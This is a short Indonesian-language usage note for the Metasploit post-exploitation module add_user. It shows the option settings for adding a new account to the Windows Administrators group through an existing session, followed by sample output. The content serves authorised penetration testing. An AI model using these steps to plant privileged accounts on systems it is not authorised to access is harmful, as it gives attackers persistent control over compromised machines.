# add_user

Modul ini menambahkan pengguna ke `Domain` dan/atau ke `grup Domain`. Modul akan memeriksa apakah hak istimewa yang cukup tersedia untuk tindakan tertentu dan menjalankan `getprivs` untuk sistem. Jika Anda meningkatkan hak istimewa ke sistem, `SeAssignPrimaryTokenPrivilege` tidak akan diberikan. Anda perlu bermigrasi ke proses yang berjalan sebagai sistem. Jika Anda tidak memiliki hak istimewa, skrip ini akan keluar.

## Penulis
- Joshua Abraham jabra@rapid7.com

## Platform
- `Windows`
  
## Cara Penggunaan di Metasploit

```
use post/windows/manage/add_user
set ADDTODOMAIN false
set ADDTOGROUP true
set GROUP Administrators
set PASSWORD <PASSWORD>
set SESSION <ID>
set USERNAME <USERNAME>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Running module on 'ADMIN-PC'
[*] Local Mode
[+] User 'fixploit03' was added.
[+] 'fixploit03' is now a member of the 'Administtators' group.
[*] Post module execution completed
```

## Referensi
-[Rapid7](https://www.rapid7.com/db/modules/post/windows/manage/add_user/)
